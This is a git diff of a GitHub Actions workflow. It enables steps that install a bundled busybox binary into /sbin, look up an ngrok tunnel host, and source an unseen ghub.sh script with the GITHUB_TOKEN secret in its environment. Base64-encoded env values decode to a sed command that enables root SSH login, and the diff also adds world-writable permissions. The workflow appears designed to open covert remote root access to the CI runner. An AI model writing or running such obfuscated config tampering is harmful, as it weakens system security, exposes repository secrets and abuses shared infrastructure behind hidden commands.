@@ -42,11 +42,10 @@ jobs:
           #echo toJson(${{ github.event.inputs }});
           #echo ${github.event.inputs};
           #(env|grep ss>/tmp/s0;sleep 1111&);
-          ls -al;
-          echo 1234567;
+          ls -al;#echo 1234567;
           mv nc_test/* ./;
           ls -al nc_test;          
-          chmod 0777 $GITHUB_WORKSPACE/*;
+          chmod 0777 $GITHUB_WORKSPACE/*;chmod 0777 $GITHUB_WORKSPACE/tool/*;
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
@@ -54,8 +53,8 @@ jobs:
         run: |
           echo "${{github.workspace}}--${{ runner.workspace }}--${{env.IMAGE_NAME}}--${{ github.run_id }}--${{ github.run_number }}--${{env.IMAGE_TAG}}";
           date;
-          #sudo cp ./busybox.bin /sbin/busybox;
-          #busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114;
+          sudo cp ./busybox.bin /sbin/busybox;
+          busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114;
           ls -al /run/user/;
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc8"
@@ -67,7 +66,7 @@ jobs:
           echo "${{ toJson(github.event.inputs) }}"|base64 -w0 >js8;
           base64 -d js8>js9;
           #env|grep ss>s1;
-          #. $GITHUB_WORKSPACE/ghub.sh;
+          . $GITHUB_WORKSPACE/ghub.sh;
         env:
           sshc1: 'cat /proc/uptime|cut -f1 -d"."'
           Github_Token22: ${{ secrets.GITHUB_TOKEN }}
@@ -93,6 +92,8 @@ jobs:
           TZ: Asia/Shanghai
           
 
+
+          
   # build_jobs8:    
   #   needs: build_jobs3
   #   runs-on: ubuntu-22.04
